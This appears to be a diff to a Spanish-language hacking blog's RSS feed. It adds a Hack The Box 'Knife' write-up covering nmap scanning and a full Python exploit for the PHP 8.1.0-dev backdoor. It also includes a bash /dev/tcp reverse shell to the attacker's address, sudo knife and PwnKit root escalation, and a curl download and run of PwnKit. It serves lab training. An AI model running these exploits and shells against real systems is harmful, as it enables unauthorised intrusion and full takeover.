@@ -1,4 +1,140 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne - Hacking Blog</title><description>No description</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>eJTPv2 Review - Tips para el Examen</title><link>https://fuwari.vercel.app/posts/ejpt/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/ejpt/</guid><description>En este articulo encontraras todo lo que nesecitas para aprobar el eJPTv2. Entre otras cositas.</description><pubDate>Wed, 28 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hace unos dias decidi tomar la certificacion &lt;code&gt;eJPTv2&lt;/code&gt;, ya que actualmente me ando preparando para tomar el CPTS y no tenia bien claro como era el ambiente de las certificaciones.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne - Hacking Blog</title><description>No description</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Knife HTB Writeup</title><link>https://fuwari.vercel.app/posts/knife/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/knife/</guid><description>Es una Maquina easy en la cual explotamos un php-dev Vulnerable y escalamos Privilegios abusando del Binario knife como permisos SUDO.</description><pubDate>Fri, 30 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Information Gathering&lt;/h1&gt;
+&lt;p&gt;Primero nuestro escaneo de nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sS -p- --open -n --min-rate 4000 -Pn 10.10.10.242 
+
+[sudo] password for mil4ne: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 21:32 EDT
+Nmap scan report for 10.10.10.242
+Host is up (0.15s latency).
+Not shown: 65217 closed tcp ports (reset), 316 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Aqui tenemos nuestro escaneo de versiones:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p22,80 -sCV 10.10.10.242                          
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 21:33 EDT
+Nmap scan report for 10.10.10.242 (10.10.10.242)
+Host is up (0.16s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Solo 2 puertos abiertos, por ssh no podemos hacer mucho, asi que vamos a ver esa web a ver que tal.&lt;/p&gt;
+&lt;h1&gt;Enumeration&lt;/h1&gt;
+&lt;h2&gt;Web - Port 80&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;image-1.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;En esta Web probe varias cosas:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Fuzzing de SubDirectorios&lt;/li&gt;
+&lt;li&gt;Fuzzing de Subdominios&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Pero no encontre nada interansente.&lt;/p&gt;
+&lt;p&gt;Lo que si vi interesante fue las versiones apache y php de la web.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; whatweb http://10.10.10.242/ 
+
+http://10.10.10.242/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Busque por exploits para la version de apache, pero en mi caso por este camino no me funciono.&lt;/p&gt;
+&lt;p&gt;Lo que si pude encontrar fue un exploit de esta version de PHP, que nos permitia RCE como el usuario James.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PHP/8.1.0-dev exploit&lt;/code&gt; - https://www.exploit-db.com/exploits/49933&lt;/p&gt;
+&lt;h1&gt;Explotation&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+import os
+import re
+import requests
+
+host = input(&quot;Enter the full host url:\n&quot;)
+request = requests.Session()
+response = request.get(host)
+
+if str(response) == &apos;&amp;lt;Response [200]&amp;gt;&apos;:
+    print(&quot;\nInteractive shell is opened on&quot;, host, &quot;\nCan&apos;t acces tty; job crontol turned off.&quot;)
+    try:
+        while 1:
+            cmd = input(&quot;$ &quot;)
+            headers = {
+            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot;,
+            &quot;User-Agentt&quot;: &quot;zerodiumsystem(&apos;&quot; + cmd + &quot;&apos;);&quot;
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split(&apos;&amp;lt;!DOCTYPE html&amp;gt;&apos;,1)
+            text = print(stdout[0])
+    except KeyboardInterrupt:
+        print(&quot;Exiting...&quot;)
+        exit
+
+else:
+    print(&quot;\r&quot;)
+    print(response)
+    print(&quot;Host is not available, aborting...&quot;)
+    exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si analizamos el exploit encontrado, vemos que recibe una url al ejecurarlo y que luego nos da una shell semi interactiva, Vamos a probarlo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 exploit.py
+
+Enter the full host url:
+http://10.10.10.242/
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Nos da una shell, pero no es muy comoda, asi que nos enviamos una nueva shell a un puerto.&lt;/p&gt;
+&lt;p&gt;Iniciamos el &lt;code&gt;nc&lt;/code&gt; escuchando en el puerto 9001:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -nlvp 9001
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Luego nos enviamos la shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.6/9001 0&amp;gt;&amp;amp;1&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora un tratamiento de TTY para tener la shell FULL interativa.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;ctrl + z&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;stty raw -echo; fg
+
+               reset xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;y listo ya tenmos todo listo.&lt;/p&gt;
+&lt;h1&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;si hacemos:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;hay un binario &lt;code&gt;knife&lt;/code&gt; con permisos sudo.&lt;/p&gt;
+&lt;p&gt;https://gtfobins.github.io/gtfobins/knife/#sudo&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo knife exec -E &apos;exec &quot;/bin/sh&quot;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Con esto ya seriamos root&lt;/p&gt;
+&lt;h2&gt;Alternativa - Privilege Escalation&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Aqui tenemos el &lt;code&gt;pkexec&lt;/code&gt;, podemos abusar de este para escalar Privilegios tambien.&lt;/p&gt;
+&lt;p&gt;https://github.com/ly4k/PwnKit&lt;/p&gt;
+&lt;p&gt;Primero lo descargamos en nuestra maquina:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Luegos nos montamos un servidor en python3 para enviar este archivo a la maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 -m http.server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora desde la maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cd /tmp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;curl http://10.10.14.6:8000/PwnKit -o PwnKit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le damos permisos de ejecucion.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x PwnKit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;./PwnKit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya tenemos root.&lt;/p&gt;
+</content:encoded></item><item><title>eJTPv2 Review - Tips para el Examen</title><link>https://fuwari.vercel.app/posts/ejpt/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/ejpt/</guid><description>En este articulo encontraras todo lo que nesecitas para aprobar el eJPTv2. Entre otras cositas.</description><pubDate>Wed, 28 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Hace unos dias decidi tomar la certificacion &lt;code&gt;eJPTv2&lt;/code&gt;, ya que actualmente me ando preparando para tomar el CPTS y no tenia bien claro como era el ambiente de las certificaciones.&lt;/p&gt;
 &lt;p&gt;En este articulo voy a dar todos los tips y herramientas que yo use en la certificacion.&lt;/p&gt;
 &lt;h1&gt;Sobre el examen&lt;/h1&gt;
 &lt;ul&gt;
